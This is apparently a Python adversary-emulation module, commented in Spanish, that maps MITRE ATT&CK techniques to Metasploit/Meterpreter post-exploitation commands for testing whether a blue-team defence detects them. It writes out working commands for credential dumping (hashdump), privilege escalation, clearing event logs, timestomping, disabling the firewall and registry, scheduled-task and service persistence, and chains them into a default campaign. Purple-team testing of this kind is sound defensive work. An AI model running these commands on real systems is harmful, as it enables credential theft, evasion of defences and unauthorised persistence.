"""adversary.py — Emulacion de adversario (post-explotacion) mapeada a MITRE ATT&CK.

Catalogo de TECNICAS que un atacante real ejecuta tras entrar a un equipo, para
MEDIR si el defensivo (SENTINEL azul) las detecta/para. Cada tecnica se ejecuta
con modulos y comandos ESTANDAR de Metasploit/Meterpreter sobre la sesion ya
abierta: no son implantes propios, es emulacion de adversario (estilo Atomic Red
Team / MITRE Caldera), la forma reconocida de validar una defensa.

Uso: el motor arma un script .rc que, tras abrir sesion, corre los comandos de
las tecnicas pedidas. La medicion (¿lo detecto el defensivo?) se correlaciona
con las alertas de SENTINEL azul por marca de tiempo.

Las tecnicas de PERSISTENCIA crean el artefacto (clave Run / tarea / servicio)
apuntando a un binario BENIGNO (calc.exe) a proposito: el objetivo es que el
defensivo lo DETECTE, no dañar nada. Incluye limpieza.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Tecnica:
    id: str                # clave corta para pedirla
    attack: str            # tecnica(s) MITRE ATT&CK
    nombre: str            # descripcion legible
    comandos: tuple        # comandos meterpreter a correr en la sesion
    limpieza: tuple = ()   # comandos para deshacer el artefacto de prueba


# Nombre del artefacto de prueba (para poder identificarlo y limpiarlo).
_MARCA = "SentinelTest"

TECNICAS: dict[str, Tecnica] = {
    "descubrimiento": Tecnica(
        "descubrimiento", "T1082/T1033", "Descubrimiento de sistema y usuario",
        ("sysinfo", "getuid", "getprivs", "ipconfig", "ps")),
    "archivos": Tecnica(
        "archivos", "T1083", "Descubrimiento de archivos y directorios",
        ("pwd", "ls")),
    "credenciales": Tecnica(
        "credenciales", "T1003", "Volcado de credenciales y hashes",
        ("hashdump", "run post/windows/gather/credentials/credential_collector")),
    "escalada": Tecnica(
        "escalada", "T1068/T1134", "Escalada de privilegios (getsystem + sugeridor)",
        ("getsystem", "run post/multi/recon/local_exploit_suggester")),
    "persistencia_run": Tecnica(
        "persistencia_run", "T1547.001", "Persistencia: clave Run del registro",
        (f"reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
         f"-v {_MARCA} -d calc.exe",),
        (f"reg deleteval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
         f"-v {_MARCA}",)),
    "persistencia_tarea": Tecnica(
        "persistencia_tarea", "T1053.005", "Persistencia: tarea programada",
        (f"execute -H -f cmd.exe -a \"/c schtasks /create /tn {_MARCA} "
         f"/tr calc.exe /sc onlogon /f\"",),
        (f"execute -H -f cmd.exe -a \"/c schtasks /delete /tn {_MARCA} /f\"",)),
    "persistencia_servicio": Tecnica(
        "persistencia_servicio", "T1543.003", "Persistencia: servicio de Windows",
        (f"execute -H -f cmd.exe -a \"/c sc create {_MARCA} binPath= calc.exe "
         f"start= auto\"",),
        (f"execute -H -f cmd.exe -a \"/c sc delete {_MARCA}\"",)),
    # ── Defense Evasion (tactica TA0005 de ATT&CK) — para medir si el Azul la para ──
    "inyeccion": Tecnica(
        "inyeccion", "T1055", "Inyeccion en proceso (migrar a proceso legitimo)",
        ("migrate -N explorer.exe",)),
    "borrar_rastros": Tecnica(
        "borrar_rastros", "T1070.001", "Borrado del registro de eventos de Windows",
        ("clearev",)),
    "timestomp": Tecnica(
        "timestomp", "T1070.006", "Manipulacion de marcas de tiempo (anti-forense)",
        ("timestomp -h",)),
    "deshabilitar_defensas": Tecnica(
        "deshabilitar_defensas", "T1562.004", "Alterar el firewall (netsh, LOLBin)",
        ("execute -H -f cmd.exe -a \"/c netsh advfirewall set allprofiles state off\"",),
        ("execute -H -f cmd.exe -a \"/c netsh advfirewall set allprofiles state on\"",)),
    "lateral": Tecnica(
        "lateral", "T1021/T1046", "Movimiento lateral y pivoting",
        ("run post/multi/manage/autoroute",
         "run post/windows/gather/enum_shares")),
    "recoleccion": Tecnica(
        "recoleccion", "T1005/T1082", "Recoleccion de datos locales",
        ("run post/multi/gather/env",
         "run post/windows/gather/enum_logged_on_users")),
}

# Campaña por defecto: cadena tipica de un intruso, en orden realista
# (descubrimiento -> credenciales -> escalada -> EVASION -> persistencia -> lateral).
CAMPANA_COMPLETA = ("descubrimiento", "credenciales", "escalada",
                    "inyeccion", "borrar_rastros", "timestomp",
                    "deshabilitar_defensas",
                    "persistencia_run", "persistencia_tarea",
                    "persistencia_servicio", "lateral", "recoleccion")


def catalogo() -> list[dict]:
    """Lista de tecnicas disponibles (id, ATT&CK, nombre)."""
    return [{"id": t.id, "attack": t.attack, "nombre": t.nombre}
            for t in TECNICAS.values()]


def comandos(tecnicas: list[str] | None, limpiar: bool = True) -> tuple[list[str], list[dict]]:
    """Devuelve (comandos_meterpreter, mapa_attack) para las tecnicas pedidas.

    `mapa_attack` documenta que ID ATT&CK ejercio cada tecnica, para la tabla de
    medicion antes/despues. Si `limpiar`, añade al final la limpieza de los
    artefactos de prueba (persistencia).
    """
    ids = tecnicas or list(CAMPANA_COMPLETA)
    cmds: list[str] = []
    mapa: list[dict] = []
    limpiezas: list[str] = []
    for tid in ids:
        t = TECNICAS.get(tid)
        if not t:
            continue
        cmds.extend(t.comandos)
        limpiezas.extend(t.limpieza)
        mapa.append({"tecnica": t.id, "attack": t.attack, "nombre": t.nombre})
    if limpiar and limpiezas:
        cmds.extend(limpiezas)
    return cmds, mapa
